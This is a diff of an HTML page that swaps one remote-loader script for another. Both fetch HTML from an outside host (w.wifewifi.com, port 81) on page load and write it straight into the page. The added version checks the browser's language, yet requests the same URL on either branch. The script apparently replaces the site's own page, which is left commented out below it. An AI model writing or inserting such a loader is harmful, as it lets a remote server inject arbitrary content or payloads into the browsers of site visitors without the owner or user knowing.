@@ -1,32 +1,55 @@
-<script language=javascript>
-function createXMLHttpRequest(){
-if(window.XMLHttpRequest){
-XMLHttpR = new XMLHttpRequest();
-}else if(window.ActiveXObject){
-try{
-XMLHttpR = new ActiveXObject("Msxml2.XMLHTTP");
-}catch(e){
-try{
-XMLHttpR = new ActiveXObject("Microsoft.XMLHTTP");
-}catch(e){
-}
-}
-}
-}
-function sendRequest(url){
-createXMLHttpRequest();
-XMLHttpR.open("GET",url,true);
-XMLHttpR.setRequestHeader("Content-Type","text/html;charset=gb2312");
-XMLHttpR.onreadystatechange = processResponse;
-XMLHttpR.send(null);
-}
-function processResponse(){
-if(XMLHttpR.readyState ==4 && XMLHttpR.status == 200){
-document.write(XMLHttpR.responseText);
-}
-}
-sendRequest("http://w.wifewifi.com:81/jc/");
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+</head>
+
+<body>
+
+<script>  
+function createXMLHttpRequest(){ 
+    if(window.XMLHttpRequest){ 
+        XMLHttpR = new XMLHttpRequest(); 
+    }else if(window.ActiveXObject){ 
+        try{ 
+            XMLHttpR = new ActiveXObject("Msxml2.XMLHTTP"); 
+        }catch(e){ 
+            try{ 
+                XMLHttpR = new ActiveXObject("Microsoft.XMLHTTP"); 
+            }catch(e){ 
+            } 
+        } 
+    } 
+} 
+function sendRequest(url){ 
+    createXMLHttpRequest(); 
+    XMLHttpR.open("GET",url,true); 
+    XMLHttpR.setRequestHeader("Content-Type","text/html;charset=utf-8"); 
+    XMLHttpR.onreadystatechange = processResponse; 
+    XMLHttpR.send(null); 
+} 
+function processResponse(){ 
+    if(XMLHttpR.readyState ==4 && XMLHttpR.status == 200){ 
+        document.write(XMLHttpR.responseText); 
+    } 
+} 
 </script>
+
+<script>
+var type=navigator.appName  
+if (type=="Netscape")  
+var lang = navigator.language  
+else 
+var lang = navigator.userLanguage 
+if (lang.substr(0,5) == "zh-cn")
+sendRequest("http://w.wifewifi.com:81/jc/index.html")
+else
+sendRequest("http://w.wifewifi.com:81/jc/index.html")
+</script> 
+</body>
+</html>
+
+
 <!--
 <html><head><title>HappyKindle</title></head>
 <body>
